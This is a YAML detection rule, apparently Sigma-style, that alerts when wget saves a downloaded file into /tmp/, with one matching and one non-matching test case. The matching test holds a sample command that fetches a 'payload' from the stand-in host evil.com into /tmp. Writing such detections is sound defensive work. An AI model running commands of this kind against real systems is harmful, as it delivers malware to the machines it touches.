name: sigma_wget_download_suspicious_directory
mode: alert
eval: |
  (
    (e.process_name == "wget") && ((re_match(e.process_args, "\\s-O\\s") || e.process_args.contains("--output-document"))) && (e.process_args.contains("/tmp/"))
  )

tests:
  - cleartext: "wget to /tmp"
    process_name: wget
    process_args: "wget http://evil.com/payload -O /tmp/payload"
    should_match: true
  - cleartext: "normal wget"
    process_name: wget
    process_args: "wget https://example.com/file.tar.gz"
    should_match: false
